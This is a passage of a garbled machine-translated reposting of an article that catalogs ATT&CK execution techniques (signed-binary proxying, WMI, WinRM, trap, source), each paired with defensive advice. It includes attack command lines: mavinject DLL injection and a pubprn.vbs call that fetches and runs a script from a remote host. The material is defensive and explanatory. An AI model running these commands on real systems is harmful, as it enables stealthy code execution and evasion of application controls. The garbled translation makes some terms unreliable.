inherit;">启动服务（服务执行）</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员，系统</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以使用与Windows服务进行交互的特殊方法来执行二进制代码，命令或脚本，例如，使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务控制管理器（SCM），</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您可以创建新服务并修改正在运行的服务。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确保系统上的当前特权设置禁止从低特权用户启动具有高特权的服务。</font><font style="vertical-align: inherit;">确保具有较低权限的用户不能替换或修改对系统具有较高权限的可执行文件。</font><font style="vertical-align: inherit;">考虑使用工具来限制使用AppLocker启动潜在危险程序并配置</font></font><i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件限制策略</font></font></a></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过签名的二进制代理执行</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用受信任的数字证书签名的二进制文件可以在受数字签名验证保护的Windows系统上运行。 Windows安装过程中默认情况下会签名的几个Microsoft文件可用于代理其他文件的启动：</font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Mavinject.exe</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是Windows实用程序，允许执行代码。 Mavinject可用于将DLL输入到正在运行的进程中：</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“ C：\ Program Files \ Common Files \ microsoft shared \ ClickToRun \ MavInject32.exe” [PID] / INJECTRUNNING [PATH DLL] </font></font></i> <br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C：\ Windows \ system32 \ mavinject.exe [PID ] / INJECTRUNNING [PATH DLL] </font></font></i> <br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SyncAppvPublishingServer.exe</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-可用于运行powershell脚本，而无需运行powershell.exe。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还有</font></font><i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更多类似的二进制文件</font></font></a></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您系统上可能未使用许多签名文件，因此请考虑阻止其启动。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过签名脚本执行（签名脚本代理执行）</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用受信任证书签名的脚本可用于代理恶意文件，例如，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PubPrn.vbs已</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用Microsoft证书签名，并可用于从远程服务器运行文件：</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cscript C：\ Windows \ System32 \ Printing_Admin_Scripts \ ru-RU \ pubprn.vbs 127.0.0.1脚本：http [：] // 192.168.1.100/hi.png </font></font></i> <br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">您的系统上可能不需要这种签名的脚本，因此请考虑阻止其启动。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源团队</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux和macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">源-一个命令，可让您从当前命令外壳中的指定文件中读取和执行所有命令，这意味着所有指定的环境变量将在将要启动的所有脚本和命令中可见。 Source可以通过两种方式启动：</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">source / path /到/ filename [arguments]</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。 /路径/到/文件名[参数]</font></font></i> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注意句点后的空格。如果没有空格，该程序将在新的命令外壳中启动。攻击者可以使用Source将未标记“ x”的文件执行为可执行文件。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 由于合法性，要防止在系统中使用内置命令非常困难，因此，保护​​媒介必须针对在攻击的早期阶段（例如在系统中传递或创建恶意文件的阶段）防止恶意行为。 </font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件名后的空格</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux，macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以通过更改其扩展名来隐藏文件的真实类型。对于某些类型的文件（不适用于.app文件），在文件名的末尾添加空格将更改操作系统处理文件的方式。例如，如果有一个名为Evil.bin的可执行文件Mach-O，则当用户双击时，操作系统将启动Terminal.app并执行它。如果将同一文件重命名为evil.txt，则双击该文件将在文本编辑器中启动。但是，如果将文件重命名为“ evil.txt”（末尾有空格），则通过双击真实文件的类型，将确定操作系统并启动二进制文件。攻击者可以使用此技术诱使用户启动恶意可执行文件。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">难以防止使用此技术，因为 </font><font style="vertical-align: inherit;">攻击者使用操作系统的标准操作机制，因此，保护​​媒介必须针对在攻击的早期阶段（例如，在系统中交付或创建恶意文件的阶段）防止恶意行为。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用第三方网络管理软件（第三方软件）执行</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows，Linux，macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户，管理员，系统</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击媒介定向到受攻击网络中用于管理目的的第三方软件和软件部署系统（SCCM，VNC，HBSS，Altris等）。如果攻击者可以访问此类系统，则攻击者可以在与软件部署系统连接的所有主机上远程运行代码。实施此技术所需的权限取决于特定的系统配置。本地凭据可能足以访问软件部署服务器；但是，可能需要管理员帐户才能启动软件部署。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查软件部署系统的安全级别。</font><font style="vertical-align: inherit;">确保对软件管理系统的访问受到限制，控制和保护。</font><font style="vertical-align: inherit;">严格使用强制性预批准策略进行远程软件部署。</font><font style="vertical-align: inherit;">向数量有限的管理员提供对软件部署系统的访问权限，确保隔离软件部署系统。</font><font style="vertical-align: inherit;">确保用于访问软件部署系统的凭据是唯一的，并且未在公司网络上的其他服务中使用。</font><font style="vertical-align: inherit;">如果将软件部署系统配置为仅运行经过签名的二进制文件，则请验证受信任证书没有存储在软件部署系统本身中，而是位于无法远程访问的系统上。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">陷阱团队</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Linux，macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户，管理员</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> trap命令用于保护脚本免受干扰（Ctrl + C，Ctrl + D，Ctrl + Z等）。如果脚本接收到trap命令的参数中指定的中断信号，则脚本将自行处理该中断信号，而Shell将不会处理该信号。攻击者可以使用陷阱来注册将在Shell收到某些中断信号时执行的代码。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于攻击者使用操作系统的标准机制，因此很难防止使用此技术。</font><font style="vertical-align: inherit;">该保护媒介应旨在防止在攻击的早期阶段（例如，在系统中传递或创建恶意文件的阶段）执行恶意操作。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过Trusted Developer Utilities运行</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">软件开发人员使用许多实用程序，这些实用程序可用于在软件开发，调试和反向工程期间以各种形式执行代码。这些实用程序通常使用数字证书进行签名，从而使它们能够绕过安全机制和应用程序白皮书来代理操作系统中的恶意代码。</font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">杂种</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是Visual Studio中使用的软件开发平台。它使用XML文件形式的项目，这些项目描述了构建各种平台和配置的要求。 .NET版本4的MSBuild允许您将C＃代码插入XML项目中，进行编译，然后执行。 MSBulid.exe由Microsoft数字证书签名。</font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该DNX</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> -净执行Environmant（dnx.exe）是Visual Studio企业的一部分，集软件开发（开发工具包）的。自2016年.NET Core CLI以来停产。 DNX在标准Windows版本中缺失，只能在使用.Net Core和ASP.NET Core 1.0时出现在开发人员主机上。 Dnx.exe经过数字签名，可用于代理代码执行。</font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RCSI</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-C＃的非交互式命令行界面，类似于csi.exe。它是在Roslyn .Net编译器平台的早期版本中引入的。 Rcsi.exe由Microsoft数字证书签名。可以在Windows命令提示符下使用Rcsi.exe编写和执行C＃.csx脚本文件。</font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinDbg / CDB</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是MS Windows内核，是用于在用户模式下进行调试的实用程序。 Microsoft控制台调试器cdb.exe也是用户模式调试器。这两个实用程序都可以用作独立工具。常用于软件开发，逆向工程，在常规Windows系统上找不到。 WinDbg.exe和CDB.exe文件均由Microsoft数字证书签名，可用于代理代码。</font></font><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">追踪器</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-tracker.exe文件跟踪实用程序。</font><font style="vertical-align: inherit;">作为MSBuild的一部分包含在.NET中。</font><font style="vertical-align: inherit;">用于在Windows 10文件系统中注册调用，攻击者可以使用tracker.exe在各种进程中执行DLL。</font><font style="vertical-align: inherit;">Tracker.exe也使用Microsoft证书签名。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果用户未将上述所有文件用于预期目的，则应将其从系统中删除。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户执行</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows，Linux，macOS </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击者可以依靠用户的某些操作来执行某些操作。当用户打开带有网络钓鱼附件并带有图标和可见文档文件扩展名的恶意可执行文件时，这可以是直接执行代码。有时，可以使用其他技术，例如，当用户单击网络钓鱼电子邮件中的链接时，这会导致利用浏览器漏洞。 “用户执行”技术通常用于入侵的其他阶段，例如，当攻击者将文件放在共享目录中或用户的桌面上时，希望他“单击”该文件。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提示</font><i><font style="vertical-align: inherit;">：</font></i><font style="vertical-align: inherit;">提高用户意识。</font><font style="vertical-align: inherit;">禁止下载.scr，.exe，.pif，.cpl等文件。</font><font style="vertical-align: inherit;">使用防病毒软件并执行IPS系统。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows管理规范（WMI）</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户，管理员</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> WMI是用于管理Windows的工具，它提供对Windows系统组件的本地和远程访问。 WMI使用SMB和RPCS（在端口135上运行）。攻击者可以使用WMI与本地和远程系统进行交互，也可以作为执行许多战术操作的一种手段，例如在资源审查（发现）阶段收集信息以及在“文字运动”期间进行远程文件执行。</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用WMI和RPCS可能导致系统不稳定。</font><font style="vertical-align: inherit;">默认情况下，只有管理员可以通过WMI远程连接到系统。</font><font style="vertical-align: inherit;">防止在管理帐户和其他特权帐户之间重复特权。</font></font><br><br><h3> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows远程管理（WinRM）</font></font></a> </h3><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows </font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户，管理员</font></font><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">说明：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Windows远程管理（WinRM）是服务和协议的名称，它允许远程用户与系统进行交互（例如，启动文件，更改注册表，更改服务。要启动，请使用winrm命令和其他程序，如PowerShell中</font></font><br><br> <i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的保护建议：</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用WinRM服务，如果有必要，有独立的账户和权限绝缘。基础设施WinRM的应该是.. </font></font><i><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinRM的建议</font></font></a></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上设置身份验证方法和使用 </font><font style="vertical-align: inherit;">randmauerov主机只允许某些设备访问WinRM的。</font></font></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/zh-CN424027/">https://habr.com/ru/post/zh-CN424027/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN424017/index.html">突破复杂：有效合作的路线图</a></li>
<li><a href="../zh-CN424019/index.html">旧计算机，Windows 7、1 GB RAM，Firefox和Internet</a></li>
<li><a href="../zh-CN424021/index.html">自学编程的挑战以及如何克服它们</a></li>
<li><a href="../zh-CN424023/index.html">我们使用Fastlane自动组装iOS应用程序</a></li>
<li><a href="../zh-CN424025/index.html">在大型React应用程序中进行路由</a></li>
<li><a href="../zh-CN424029/index.html">关于懒惰</a></li>
<li><a href="../zh-CN424031/index.html">使用JAX-RS进行反应式编程</a></li>
<li><a href="../zh-CN424033/index.html">Kotlin在做什么：采访Andrei Breslav</a></li>
<li><a href="../zh-CN424035/index.html">2019年是英特尔停止的一年</a></li>
<li><a href="../zh-CN424037/index.html">GraphQL简介</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>